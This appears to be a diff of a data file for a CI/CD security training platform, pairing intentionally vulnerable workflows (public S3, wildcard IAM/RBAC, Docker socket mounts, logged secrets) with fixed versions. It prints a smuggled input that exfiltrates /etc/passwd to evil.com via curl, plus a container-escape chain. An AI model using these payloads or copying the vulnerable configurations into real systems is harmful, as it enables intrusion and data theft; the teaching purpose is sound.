     "solutionWorkflow": "name: Build Secure App\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: docker push myapp:latest\n",
@@ -383,6 +582,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "kubernetes",
       "network-policy",
       "segmentation"
+    ],
+    "prerequisites": [],
+    "objectives": [
+      "Deny traffic by default between services",
+      "Allow-list only required service paths"
+    ],
+    "references": [
+      {
+        "page": "kubernetes",
+        "label": "Network segmentation guide"
+      }
     ],
     "scenario": "# Scenario: Open Network Chaos\n\nYour cluster runs multiple microservices: a web frontend, an API backend, a database, and a payment service. All deployed without any NetworkPolicy.\n\nBy default, Kubernetes allows all pod-to-pod communication. This means:\n- A compromised frontend pod can directly access the database\n- Any pod can reach the payment service\n- Lateral movement is trivial for attackers\n\n**Your mission:** Add NetworkPolicy resources to restrict traffic flow. The frontend should only reach the API, the API should only reach the database, and the payment service should be isolated.\n\n## Key principle\nZero-trust networking: deny all by default, then allow specific paths.\n",
     "vulnerableWorkflow": "name: Deploy Microservices\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy services\n        run: |\n          cat <<'EOF' > services.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: frontend\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: frontend\n            template:\n              metadata:\n                labels:\n                  app: frontend\n              spec:\n                containers:\n                  - name: frontend\n                    image: frontend:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: api\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: api\n            template:\n              metadata:\n                labels:\n                  app: api\n              spec:\n                containers:\n                  - name: api\n                    image: api:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: database\n          spec:\n            replicas: 1\n            selector:\n              matchLabels:\n                app: database\n            template:\n              metadata:\n                labels:\n                  app: database\n              spec:\n                containers:\n                  - name: database\n                    image: postgres:16\n          EOF\n          kubectl apply -f services.yml\n",
@@ -407,6 +617,17 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "s3",
       "public-access"
     ],
+    "prerequisites": [],
+    "objectives": [
+      "Enforce private ACLs and public access blocks",
+      "Enable encryption on stored data"
+    ],
+    "references": [
+      {
+        "page": "terraform",
+        "label": "Storage hardening guide"
+      }
+    ],
     "scenario": "# Scenario: Public S3 Bucket\n\nYour Terraform configuration creates an S3 bucket with `acl = \"public-read\"` and `block_public_acls = false`. The bucket is used to store application backups and log files.\n\nAnyone on the internet can list and download the bucket contents. This includes:\n- Application source code\n- Database backups with credentials\n- Log files with user data and PII\n- Internal configuration files\n\nThis is one of the most common AWS misconfigurations and a frequent cause of data breaches.\n\n**Your mission:** Change the ACL to private and enable public access blocks.\n",
     "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > main.tf\n          resource \"aws_s3_bucket\" \"data\" {\n            bucket = \"myapp-backups\"\n          }\n\n          resource \"aws_s3_bucket_acl\" \"data\" {\n            bucket = aws_s3_bucket.data.id\n            acl    = \"public-read\"\n          }\n\n          resource \"aws_s3_bucket_public_access_block\" \"data\" {\n            bucket                  = aws_s3_bucket.data.id\n            block_public_acls       = false\n            block_public_policy     = false\n            ignore_public_acls      = false\n            restrict_public_buckets = false\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
     "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > main.tf\n          resource \"aws_s3_bucket\" \"data\" {\n            bucket = \"myapp-backups\"\n          }\n\n          resource \"aws_s3_bucket_acl\" \"data\" {\n            bucket = aws_s3_bucket.data.id\n            acl    = \"private\"\n          }\n\n          resource \"aws_s3_bucket_public_access_block\" \"data\" {\n            bucket                  = aws_s3_bucket.data.id\n            block_public_acls       = true\n            block_public_policy     = true\n            ignore_public_acls      = true\n            restrict_public_buckets = true\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
@@ -429,9 +650,23 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "alerts",
       "error-handling"
     ],
+    "prerequisites": [
+      "mon-no-build-status",
+      "error-swallowing"
+    ],
+    "objectives": [
+      "Remove error suppression from security steps",
+      "Add failure alerts that reach a human"
+    ],
+    "references": [
+      {
+        "page": "monitoring",
+        "label": "Failure alerts guide"
+      }
+    ],
     "scenario": "# Scenario: Silent Failure\n\nYour deploy pipeline has `continue-on-error: true` on critical steps like testing, security scanning, and deployment verification. The pipeline \"succeeds\" even when tests fail, vulnerabilities are found, or health checks fail.\n\nThe team only discovers issues when users report them — hours or days after deployment. There are no alerts, no notifications, no Slack messages. Failures vanish into the void.\n\n**Your mission:** Remove `continue-on-error: true` from critical steps and add a failure notification step that alerts the team.\n",
     "vulnerableWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n        continue-on-error: true\n\n      - name: Security scan\n        run: npm audit --audit-level=high\n        continue-on-error: true\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to production...\"\n          echo \"Deploy complete\"\n        continue-on-error: true\n\n      - name: Health check\n        run: |\n          echo \"Checking health endpoint...\"\n          echo \"Health check passed\"\n        continue-on-error: true\n",
-    "solutionWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Security scan\n        run: npm audit --audit-level=high\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to production...\"\n          echo \"Deploy complete\"\n\n      - name: Health check\n        run: |\n          echo \"Checking health endpoint...\"\n          echo \"Health check passed\"\n\n      - name: Notify on failure\n        if: failure()\n        env:\n          REPO: ${{ github.repository }}\n          SHA: ${{ github.sha }}\n          REF: ${{ github.ref_name }}\n        run: |\n          echo \"DEPLOYMENT FAILED - alerting team\"\n          echo \"Repository: $REPO\"\n          echo \"Commit: $SHA\"\n          echo \"Branch: $REF\"\n",
+    "solutionWorkflow": "name: Deploy\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\njobs:\r\n  deploy:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install\r\n        run: npm ci\r\n\r\n      - name: Test\r\n        run: npm test\r\n\r\n      - name: Security scan\r\n        run: npm audit --audit-level=high\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n      - name: Deploy\r\n        run: |\r\n          echo \"Deploying to production...\"\r\n          echo \"Deploy complete\"\r\n\r\n      - name: Health check\r\n        run: |\r\n          echo \"Checking health endpoint...\"\r\n          echo \"Health check passed\"\r\n\r\n      - name: Notify on failure\r\n        if: failure()\r\n        env:\r\n          REPO: ${{ github.repository }}\r\n          SHA: ${{ github.sha }}\r\n          REF: ${{ github.ref_name }}\r\n        run: |\r\n          echo \"DEPLOYMENT FAILED - alerting team\"\r\n          echo \"Repository: $REPO\"\r\n          echo \"Commit: $SHA\"\r\n          echo \"Branch: $REF\"\r\n",
     "hints": [
       "# Hint 1: continue-on-error danger\n\n`continue-on-error: true` makes a failing step report as \"success\" to GitHub. The pipeline continues as if nothing went wrong. Critical failures — test failures, security issues, deployment problems — are silently swallowed.\n",
       "# Hint 2: The fix\n\nRemove `continue-on-error: true` from all critical steps. Add a notification step with `if: failure()` that sends alerts via Slack webhook, email, or GitHub Issues. The `always()` condition ensures notifications run even when previous steps fail.\n"
@@ -450,6 +685,19 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "injection",
       "reusable-workflows",
       "inputs"
+    ],
+    "prerequisites": [
+      "script-injection"
+    ],
+    "objectives": [
+      "Sanitize reusable workflow inputs before shell use",
+      "Apply env indirection to inputs like any untrusted context"
+    ],
+    "references": [
+      {
+        "page": "github-actions",
+        "label": "Script injection guide"
+      }
     ],
     "scenario": "# Scenario: Reusable Workflow Injection\n\nYour team created a reusable workflow for shared CI/CD tasks. It accepts `inputs` from caller workflows and uses them in `run:` steps via `${{ inputs.name }}` interpolation.\n\nThe problem: GitHub Actions substitutes `${{ inputs.* }}` BEFORE bash sees the command. If a caller passes a malicious value like:\n\n```\nname: \"test\"; curl https://evil.com/steal -d @/etc/passwd\"\n```\n\nIt becomes arbitrary code execution. Any repository in your org that calls this reusable workflow can exploit it.\n\n**Your mission:** Refactor the reusable workflow to pass inputs through environment variables instead of direct expression interpolation.\n\n## Key concepts\n- `${{ inputs.x }}` is substituted pre-shell — injection risk\n- `env: { VAR: ${{ inputs.x }} }` followed by `$VAR` in shell — safe\n- Environment variables are not subject to shell injection\n",
     "vulnerableWorkflow": "name: Reusable Deploy\n\non:\n  workflow_call:\n    inputs:\n      environment:\n        required: true\n        type: string\n      version:\n        required: false\n        type: string\n        default: 'latest'\n    secrets:\n      AWS_ACCESS_KEY_ID:\n        required: true\n      AWS_SECRET_ACCESS_KEY:\n        required: true\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy to environment\n        run: |\n          echo \"Deploying version ${{ inputs.version }} to ${{ inputs.environment }}\"\n          echo \"Running deploy script for ${{ inputs.environment }}\"\n\n      - name: Notify\n        run: |\n          echo \"Deployment of ${{ inputs.version }} to ${{ inputs.environment }} complete\"\n",
@@ -473,6 +721,19 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "socket",
       "privilege-escalation"
     ],
+    "prerequisites": [
+      "docker-running-as-root"
+    ],
+    "objectives": [
+      "Explain why daemon control equals host root",
+      "Build inside remote builders or unprivileged tools"
+    ],
+    "references": [
+      {
+        "page": "docker",
+        "label": "Container escape guide"
+      }
+    ],
     "scenario": "# Scenario: Docker Socket Escape\n\nYour CI pipeline uses Docker-in-Docker (DinD) by mounting `/var/run/docker.sock` into the build container. This lets the build container create new containers on the host.\n\nThe Docker socket is equivalent to root access. A compromised build container can:\n1. Create a privileged container that mounts the host filesystem\n2. Extract all secrets from other containers\n3. Install persistent backdoors on the host\n4. Pivot to other machines on the network\n\n**Your mission:** Remove the Docker socket mount. Use a remote Docker builder, kaniko, or buildx with a remote builder instead.\n\n## Attack chain\n```\nContainer with docker.sock → docker run -v /:/host alpine → chroot /host → full host compromise\n```\n",
     "vulnerableWorkflow": "name: Build with DinD\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    container:\n      image: docker:24-dind\n      volumes:\n        - /var/run/docker.sock:/var/run/docker.sock\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          docker push myapp:latest\n",
     "solutionWorkflow": "name: Build with Buildx\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: myapp:latest\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n",
@@ -494,6 +755,19 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "kubernetes",
       "rbac",
       "privilege-escalation"
+    ],
+    "prerequisites": [
+      "permissions-overkill"
+    ],
+    "objectives": [
+      "Remove wildcard verbs and resources from bindings",
+      "Scope roles to namespaces that need them"
+    ],
+    "references": [
+      {
+        "page": "kubernetes",
+        "label": "RBAC hardening guide"
+      }
     ],
     "scenario": "# Scenario: RBAC Privilege Escalation\n\nYour CI pipeline applies a ClusterRole and ClusterRoleBinding with wildcard permissions (`verbs: [\"*\"]`, `resources: [\"*\"]`). This was done for \"convenience\" so the app wouldn't hit permission errors.\n\nThe problem: any pod that uses the bound ServiceAccount can:\n- Read all Secrets in the cluster (including credentials)\n- Create new pods that mount host filesystems\n- Create new ClusterRoleBindings to grant itself admin access\n- Essentially become cluster-admin\n\n**Your mission:** Replace wildcard permissions with specific, least-privilege rules. Only grant the exact verbs and resources the application needs.\n\n## The escalation chain\n```\nWildcard ClusterRole → read Secrets → mount host → full cluster compromise\n```\n",
     "vulnerableWorkflow": "name: Setup RBAC\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply RBAC\n        run: |\n          cat <<'EOF' > rbac.yml\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: ClusterRole\n          metadata:\n            name: app-role\n          rules:\n            - apiGroups: [\"\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n            - apiGroups: [\"apps\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n            - apiGroups: [\"batch\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n          ---\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: ClusterRoleBinding\n          metadata:\n            name: app-role-binding\n          subjects:\n            - kind: ServiceAccount\n              name: app-sa\n              namespace: default\n          roleRef:\n            kind: ClusterRole\n            name: app-role\n            apiGroup: rbac.authorization.k8s.io\n          EOF\n          kubectl apply -f rbac.yml\n",
@@ -518,6 +792,19 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "iam",
       "least-privilege"
     ],
+    "prerequisites": [
+      "permissions-overkill"
+    ],
+    "objectives": [
+      "Replace wildcard actions with specific API calls",
+      "Scope resources to exact ARNs"
+    ],
+    "references": [
+      {
+        "page": "terraform",
+        "label": "IAM least privilege guide"
+      }
+    ],
     "scenario": "# Scenario: IAM Wildcard Policies\n\nYour Terraform creates an IAM policy with `\"Action\": \"*\"` and `\"Resource\": \"*\"`. This grants the entity (user, role, or service) full access to every AWS service and resource.\n\nThis is equivalent to giving someone the AWS root credentials. If the credentials leak (via compromised CI, leaked env var, or social engineering), the attacker can:\n- Access all S3 buckets\n- Modify any infrastructure\n- Create backdoor IAM users\n- Exfiltrate all data\n\n**Your mission:** Replace wildcards with specific actions and resource ARNs. Only grant what the application actually needs.\n\n## Example of least-privilege\nInstead of `\"Action\": \"*\"`, use `\"Action\": [\"s3:GetObject\", \"s3:PutObject\"]`\nInstead of `\"Resource\": \"*\"`, use `\"Resource\": \"arn:aws:s3:::my-bucket/*\"`\n",
     "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > iam.tf\n          resource \"aws_iam_policy\" \"app_policy\" {\n            name        = \"app-full-access\"\n            description = \"Full access for application\"\n\n            policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect   = \"Allow\"\n                  Action   = \"*\"\n                  Resource = \"*\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role\" \"app_role\" {\n            name = \"app-role\"\n\n            assume_role_policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Principal = {\n                    Service = \"ec2.amazonaws.com\"\n                  }\n                  Action = \"sts:AssumeRole\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role_policy_attachment\" \"app\" {\n            role       = aws_iam_role.app_role.name\n            policy_arn = aws_iam_policy.app_policy.arn\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
     "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > iam.tf\n          resource \"aws_iam_policy\" \"app_policy\" {\n            name        = \"app-limited-access\"\n            description = \"Limited access for application\"\n\n            policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Action = [\n                    \"s3:GetObject\",\n                    \"s3:PutObject\",\n                    \"s3:ListBucket\"\n                  ]\n                  Resource = [\n                    \"arn:aws:s3:::myapp-bucket\",\n                    \"arn:aws:s3:::myapp-bucket/*\"\n                  ]\n                },\n                {\n                  Effect = \"Allow\"\n                  Action = [\n                    \"logs:CreateLogGroup\",\n                    \"logs:CreateLogStream\",\n                    \"logs:PutLogEvents\"\n                  ]\n                  Resource = \"arn:aws:logs:*:*:*\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role\" \"app_role\" {\n            name = \"app-role\"\n\n            assume_role_policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Principal = {\n                    Service = \"ec2.amazonaws.com\"\n                  }\n                  Action = \"sts:AssumeRole\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role_policy_attachment\" \"app\" {\n            role       = aws_iam_role.app_role.name\n            policy_arn = aws_iam_policy.app_policy.arn\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
@@ -540,6 +827,19 @@ export const STATIC_CHALLENGES: StaticChallenge[] = [
       "logs",
       "secrets",
       "masking"
+    ],
+    "prerequisites": [
+      "secrets-leak"
+    ],
+    "objectives": [
+      "Mask secrets before they reach logs",
+      "Filter sensitive fields from structured output"
+    ],
+    "references": [
+      {
+        "page": "monitoring",
+        "label": "Log hygiene guide"
+      }
     ],
     "scenario": "# Scenario: Secrets in CI Logs\n\nYour workflow echoes secrets for debugging purposes — `echo ${{ secrets.API_TOKEN }}` to \"verify it's set.\" These logs are stored in GitHub's log storage and are accessible to anyone with Actions read access.\n\nEven after you remove the echo step, the secrets remain in the historical logs. Attackers who gain read access to your repository can extract all secrets that were ever logged.\n\nAdditionally, some steps output sensitive data to stdout/stderr by default (like `npm install` showing auth tokens in verbose mode).\n\n**Your mission:** Remove all secret logging and add `::add-mask::` to mask any sensitive values that must appear in logs.\n\n## Key concepts\n- `::add-mask::VALUE` redacts a value from all subsequent log output\n- Secrets logged once are exposed forever — there's no \"unlog\"\n- Even `echo ${{ secrets.X }}` before the mask leaks the value\n",
     "vulnerableWorkflow": "name: Deploy with Secrets\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Verify credentials\n        run: |\n          echo \"API Token: ${{ secrets.API_TOKEN }}\"\n          echo \"AWS Key: ${{ secrets.AWS_ACCESS_KEY_ID }}\"\n          echo \"DB Password: ${{ secrets.DB_PASSWORD }}\"\n\n      - name: Setup credentials\n        run: |\n          echo \"Setting up AWS credentials...\"\n          export AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}\n          export AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}\n\n      - name: Deploy\n        run: |\n          echo \"Deploying with token ${{ secrets.API_TOKEN }}...\"\n          echo \"Deploy complete\"\n",
